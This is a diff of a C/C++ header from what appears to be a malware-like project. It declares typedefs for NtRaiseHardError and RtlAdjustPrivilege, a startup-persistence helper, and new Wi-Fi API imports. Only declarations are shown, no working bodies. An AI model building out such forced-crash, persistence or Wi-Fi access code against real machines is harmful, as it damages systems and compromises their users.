@@ -7,9 +7,13 @@
 #ifdef __linux__
 
 #include <unistd.h>
-void linux_skadi();
 
 #elif _WIN32
+
+
+#include <winsock2.h>
+#include <wlanapi.h>
+//#include <wtypes.h>
 
 #include <windows.h>
 #include <windef.h>
@@ -22,14 +26,16 @@ void linux_skadi();
 #include <shellAPI.h>
 #include <string>
 
+
+// Link with libraries
+#pragma comment(lib, "wlanapi.lib")
 #pragma comment(lib,"Shlwapi.lib")
 
 typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
 typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
 
+void windows_heimdall();
 bool FileExists(std::wstring fileName);
 void copyFileToStartUp();
-
-void windows_skadi();
 
 #endif
